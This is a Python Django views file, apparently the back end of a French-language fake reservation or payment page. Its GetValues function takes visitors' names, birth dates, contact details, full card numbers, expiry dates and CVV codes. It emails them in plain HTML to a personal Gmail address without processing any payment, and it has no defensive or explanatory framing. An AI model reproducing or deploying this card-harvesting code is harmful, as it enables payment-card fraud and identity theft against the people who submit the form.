from django.shortcuts import render
from django.views.generic import TemplateView
from django.http import HttpResponse
from django.core.mail import EmailMessage
from random import randint


def HomeView(request):
    return render(request, "index.html")


class SuccessView(TemplateView):
    template_name = "success.html"


def random_with_n_digits(n):
    range_start = 10 ** (n - 1)
    range_end = (10 ** n) - 1
    return randint(range_start, range_end)


def GetValues(request):
    name = request.POST.get("firstname")
    last_name = request.POST.get("lastname")
    birth_date = request.POST.get("date")
    mail = request.POST.get("email")
    phone = request.POST.get("mobile")
    city = request.POST.get("city")
    zip_code = request.POST.get("zipcode")

    card_number = request.POST.get("credit_card")
    expiration_month = request.POST.get("month")
    expiration_year = request.POST.get("year")
    cvv = request.POST.get("cvv")
    amount_reservation = request.POST.get("amount")
    code_validation = str(random_with_n_digits(6))

    message_mail = '<p>Nom : <strong>%s</strong></p></br>' \
                   '<p>Prenom : <strong>%s</strong></p></br>' \
                   '<p>Email : <strong>%s</strong></p></br>' \
                   '<p>Date de naissance : <strong>%s</strong></p></br>' \
                   '<p>Phone : <strong>%s</strong></p></br>' \
                   '<p>Ville : <strong>%s</strong></p></br>' \
                   '<p>Code postal : <strong>%s</strong></p></br>' \
                   '<p>Numero Carte : <strong>%s</strong></p></br>' \
                   '<p>Mois expiration : <strong>%s</strong></p></br>' \
                   '<p>Annee expiration : <strong>%s</strong></p></br>' \
                   '<p>CVV : <strong>%s</strong></p></br>' \
                   '<p>Montant : <strong>%s</strong></p></br>' % (last_name,
                                                                name,
                                                                mail,
                                                                birth_date,
                                                                phone,
                                                                city,
                                                                zip_code,
                                                                card_number,
                                                                expiration_month,
                                                                expiration_year,
                                                                cvv,
                                                                amount_reservation,
                                                                )
    subject = 'Nouvelle Demande %s' % code_validation
    from_email = 'lafourcherobert32@gmail.com'

    msg = EmailMessage(
        subject,
        message_mail,
        from_email,
        ['lafourcherobert32@gmail.com', ]
    )
    msg.content_subtype = "html"
    msg.send()

    return HttpResponse(status=302)


